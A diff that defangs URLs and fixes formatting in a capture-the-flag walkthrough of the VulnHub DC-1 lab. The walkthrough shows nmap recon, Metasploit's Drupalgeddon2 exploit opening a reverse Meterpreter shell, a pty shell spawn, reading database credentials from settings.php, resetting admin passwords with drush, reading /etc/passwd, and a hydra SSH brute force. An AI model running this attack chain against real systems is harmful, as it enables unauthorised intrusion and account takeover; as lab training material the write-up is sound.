@@ -1,11 +1,11 @@
 # DC-1: 1  
   
-**URL: https://www.vulnhub.com/entry/dc-1-1,292/**  
+**URL: hxxps://www.vulnhub.com/entry/dc-1-1,292/**  
   
 ### NMAP  
   
 root@kali:~# nmap -A 192.168.111.3  
->Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-16 09:30 CDT  
+>Starting Nmap 7.70 ( hxxps://nmap.org ) at 2019-04-16 09:30 CDT  
 >mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers  
 >Nmap scan report for 192.168.111.3  
 >Host is up (0.00064s latency).  
@@ -17,7 +17,7 @@ root@kali:~# nmap -A 192.168.111.3
 >|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)  
 >|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)  
 >80/tcp  open  http    Apache httpd 2.2.22 ((Debian))  
->|_http-generator: Drupal 7 (http://drupal.org)  
+>|_http-generator: Drupal 7 (hxxp://drupal.org)  
 >| http-robots.txt: 36 disallowed entries (15 shown)  
 >| /includes/ /misc/ /modules/ /profiles/ /scripts/   
 >| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt   
@@ -40,7 +40,7 @@ Once we see that is running drupal version 7, it is pretty straight forward:
 msf5 exploit(unix/webapp/drupal_drupalgeddon2) > run  
   
 >\[\*\] Started reverse TCP handler on 192.168.111.5:4444   
->\[\*\] Drupal 7 targeted at http://192.168.111.3/  
+>\[\*\] Drupal 7 targeted at hxxp://192.168.111.3/  
 >\[\-\] Could not determine Drupal patch level  
 >\[\*\] Sending stage (38247 bytes) to 192.168.111.3  
 >\[\*\] Meterpreter session 1 opened (192.168.111.5:4444 -> 192.168.111.3:52352) at 2019-04-16 09:35:13 -0500  
@@ -49,17 +49,19 @@ meterpreter > sysinfo
 >Computer    : DC-1  
 >OS          : Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686  
 >Meterpreter : php/linux  
+
 meterpreter > getuid  
 >Server username: www-data (33)  
   
 We pop up a interactive shell and start testing:  
   
 >python -c 'import pty;pty.spawn("/bin/bash")'    
+
 www-data@DC-1:/var/www$ hostname  
-DC-1  
+>DC-1  
   
 www-data@DC-1:/var/www$ id  
-uid=33(www-data) gid=33(www-data) groups=33(www-data)  
+>uid=33(www-data) gid=33(www-data) groups=33(www-data)  
   
 www-data@DC-1:/var/www$ cat flag1.txt  
 >Every good CMS needs a config file - and so do you.  
@@ -76,16 +78,16 @@ www-data@DC-1:/var/www$ netstat -punta | grep LISTEN
 We see a SMTP server that could lead to something and a mysql server. Let's explore that option first:  
   
 www-data@DC-1:/var/www$ cat sites/default/settings.php   
-><?php  
+>\<\?php  
 >  
->/**  
-> *  
-> * flag2  
-> * Brute force and dictionary attacks aren't the  
-> * only ways to gain access (and you WILL need access).  
-> * What can you do with these credentials?  
-> *  
-> */  
+>\/\*\*  
+> \*  
+> \* flag2  
+> \* Brute force and dictionary attacks aren't the  
+> \* only ways to gain access (and you WILL need access).  
+> \* What can you do with these credentials?  
+> \*  
+> \*\/  
 >  
 >$databases = array (  
 >  'default' =>   
@@ -121,7 +123,7 @@ www-data@DC-1:/var/www$ mysql -u dbuser -p
 >  
 >3 rows in set (0.00 sec)  
   
-No need to break the passwords, we can just change their pass.  
+No need to break their passwords, we can just change them.  
   
 www-data@DC-1:/var/www$ drush user-password Fred --password="fred"  
 >Changed password for Fred                                              [success]  
@@ -131,29 +133,29 @@ www-data@DC-1:/var/www$ drush user-password admin --password="admin"
   
 We log in as the admin and find a content page named flag3 with the following text:  
   
-http://192.168.111.3/node/2#overlay=admin/content  
+hxxp://192.168.111.3/node/2#overlay=admin/content  
   
 >Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.  
   
 Well, let's go back to our shell:  
   
 www-data@DC-1:/var/www$ cat /etc/passwd  
->root:x:0:0:root:/root:/bin/bash  
+>root\:x\:0:0:root:/root:/bin/bash  
 >...  
->flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash  
+>flag4\:x\:1001:1001:Flag4,,,:/home/flag4:/bin/bash  
   
 There's a user named flag4. Let's brute force our way in:  
   
 root@kali:~# hydra -l flag4 -P /usr/share/wordlists/rockyou.txt ssh://192.168.111.3  
 >Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.  
 >  
->Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-04-16 10:56:09  
+>Hydra (hxxps://github.com/vanhauser-thc/thc-hydra) starting at 2019-04-16 10:56:09  
 >[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task  
 >[DATA] attacking ssh://192.168.111.3:22/  
 >[22][ssh] host: 192.168.111.3   login: flag4   password: orange  
 >1 of 1 target successfully completed, 1 valid password found  
 >[WARNING] Writing restore file because 2 final worker threads did not complete until end.  
->Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-04-16 10:57:11  
+>Hydra (hxxps://github.com/vanhauser-thc/thc-hydra) finished at 2019-04-16 10:57:11  
   
 So easy.   
   
